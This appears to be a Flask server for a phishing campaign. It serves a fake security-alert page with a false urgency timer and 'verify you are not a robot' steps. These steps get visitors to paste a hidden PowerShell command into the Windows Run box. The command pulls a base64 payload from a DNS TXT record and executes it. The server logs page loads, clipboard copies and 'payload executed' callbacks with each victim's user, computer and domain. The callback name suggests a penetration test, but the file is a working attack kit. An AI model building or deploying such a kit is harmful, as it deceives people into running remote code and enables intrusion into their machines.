from flask import Flask, request, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)

def log_event(event_data):
    print(json.dumps(event_data))
    try:
        with open('events.log', 'a') as f:
            f.write(json.dumps(event_data) + '\n')
    except:
        pass

@app.route('/track', methods=['GET', 'OPTIONS'])
def track():
    if request.method == 'OPTIONS':
        return '', 204
    
    event_data = {
        'event': request.args.get('event', 'unknown'),
        'user_id': request.args.get('id', 'unknown'),
        'timestamp': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
    }
    
    log_event(event_data)
    print(f"✅ [{event_data['event']}] User: {event_data['user_id']}")
    
    return '', 204

@app.route('/dns-callback', methods=['GET', 'OPTIONS'])
def dns_callback():
    if request.method == 'OPTIONS':
        return '', 204
    
    event_data = {
        'event': 'EXECUTION',
        'user': request.args.get('u', 'unknown'),
        'computer': request.args.get('c', 'unknown'),
        'domain': request.args.get('d', 'unknown'),
        'timestamp': datetime.now().isoformat(),
        'ip': request.remote_addr
    }
    
    log_event(event_data)
    print(f"🚨 PAYLOAD EXECUTED")
    print(f"User: {event_data['user']} @ {event_data['computer']}")
    
    return '', 204

@app.route('/results', methods=['GET'])
def results():
    try:
        with open('events.log', 'r') as f:
            events = [json.loads(line) for line in f]
        return jsonify(events)
    except:
        return jsonify([])

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'})

@app.route('/verify.html', methods=['GET'])
def verify_page():
    html = """<!DOCTYPE html>
<html>
<head>
    <title>Security Alert - Action Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 700px; margin: 0 auto; padding: 20px; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); min-height: 100vh; }
        .container { background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); overflow: hidden; }
        .header { background: #d32f2f; color: white; padding: 20px; text-align: center; }
        .header h1 { margin: 0; font-size: 24px; font-weight: 600; }
        .alert-icon { font-size: 64px; margin-bottom: 10px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        .content { padding: 30px; }
        .alert-box { background: #fff3cd; border-left: 4px solid #ff9800; padding: 15px; margin: 20px 0; border-radius: 4px; }
        .alert-box strong { color: #d32f2f; }
        .details { background: #f5f5f5; padding: 15px; border-radius: 4px; margin: 20px 0; font-size: 14px; }
        .details-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #ddd; }
        .details-row:last-child { border-bottom: none; }
        .verification-box { background: #e3f2fd; border: 2px solid #2196F3; padding: 20px; border-radius: 8px; margin: 30px 0; text-align: center; }
        .verification-box h2 { color: #1976d2; margin-top: 0; font-size: 18px; }
        .steps { text-align: left; background: white; padding: 15px; border-radius: 4px; margin: 15px 0; }
        .steps ol { margin: 10px 0; padding-left: 25px; }
        .steps li { margin: 8px 0; line-height: 1.6; }
        .code-box { background: #263238; color: #4CAF50; padding: 15px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 11px; margin: 20px 0; cursor: pointer; word-break: break-all; display: none; }
        .verify-btn { background: #4CAF50; color: white; border: none; padding: 15px 40px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; box-shadow: 0 2px 4px rgba(0,0,0,0.2); transition: all 0.3s; }
        .verify-btn:hover { background: #45a049; transform: translateY(-2px); }
        .copied { background: #2196F3 !important; }
        .timer { color: #d32f2f; font-weight: bold; font-size: 18px; margin: 15px 0; }
        .footer { background: #f5f5f5; padding: 15px; text-align: center; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="alert-icon">🛡️</div>
            <h1>SECURITY VERIFICATION REQUIRED</h1>
            <p style="margin: 10px 0 0 0; font-size: 14px;">Suspicious Activity Detected</p>
        </div>
        <div class="content">
            <div class="alert-box">
                <strong>⚠️ ATTENTION:</strong> Our security system has detected unusual access patterns to your shared documents from an unrecognized location.
            </div>
            <div class="details">
                <div class="details-row"><span><strong>Alert Type:</strong></span><span>Unauthorized Access Attempt</span></div>
                <div class="details-row"><span><strong>Resource:</strong></span><span>Q4_Reconciliation_Documents.zip</span></div>
                <div class="details-row"><span><strong>Flagged Location:</strong></span><span>185.220.101.47 (Unknown)</span></div>
                <div class="details-row"><span><strong>Detection Time:</strong></span><span id="timestamp"></span></div>
                <div class="details-row"><span><strong>Risk Level:</strong></span><span style="color: #d32f2f; font-weight: bold;">HIGH</span></div>
            </div>
            <div class="verification-box">
                <div style="font-size: 48px; margin: 10px 0;">🤖</div>
                <h2>Verify You Are Not A Robot</h2>
                <p>To maintain access to your documents and prevent unauthorized access, please complete the verification below.</p>
                <div class="timer">⏱️ Session expires in: <span id="countdown">05:00</span></div>
                <div class="steps">
                    <strong>Quick Verification Steps:</strong>
                    <ol>
                        <li>Click the <strong style="color: #4CAF50;">"Verify I'm Human"</strong> button below</li>
                        <li>Press <strong>Windows Key + R</strong> on your keyboard</li>
                        <li>Press <strong>Ctrl + V</strong> to paste the verification code</li>
                        <li>Press <strong>Enter</strong> to complete verification</li>
                    </ol>
                </div>
                <div class="code-box" id="codeBox"></div>
                <button class="verify-btn" id="verifyBtn" onclick="copyCode()">🛡️ Verify I'm Human</button>
                <p style="margin-top: 20px; font-size: 12px; color: #666;">This verification helps protect your account from automated attacks.</p>
            </div>
        </div>
        <div class="footer"><strong>PhishAlert Security Services</strong><br>Protecting your organization's digital assets 24/7</div>
    </div>
    <script>
        const CALLBACK_URL = 'https://ptest-callback-production.up.railway.app';
        document.getElementById('timestamp').innerText = new Date().toLocaleString();
        let timeLeft = 300;
        const countdownEl = document.getElementById('countdown');
        setInterval(() => {
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            countdownEl.innerText = minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
            if (timeLeft <= 0) countdownEl.innerText = 'EXPIRED';
        }, 1000);
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id') || 'unknown';
        function copyCode() {
            const command = 'powershell -w hidden -c "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Resolve-DnsName -Type TXT verify.phishalert.net -Server 8.8.8.8).Strings)))"';
            navigator.clipboard.writeText(command).then(function() {
                document.getElementById('codeBox').style.display = 'block';
                document.getElementById('codeBox').innerText = command;
                document.getElementById('verifyBtn').innerText = '✅ Code Copied! Now Press Win+R and Paste';
                document.getElementById('verifyBtn').classList.add('copied');
                document.getElementById('verifyBtn').disabled = true;
                fetch(CALLBACK_URL + '/track?event=copy&id=' + userId).catch(err => console.log('Tracked'));
            }).catch(function(err) { alert('Please allow clipboard access'); });
        }
        fetch(CALLBACK_URL + '/track?event=load&id=' + userId).catch(err => console.log('Tracked'));
    </script>
</body>
</html>"""
    return html

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
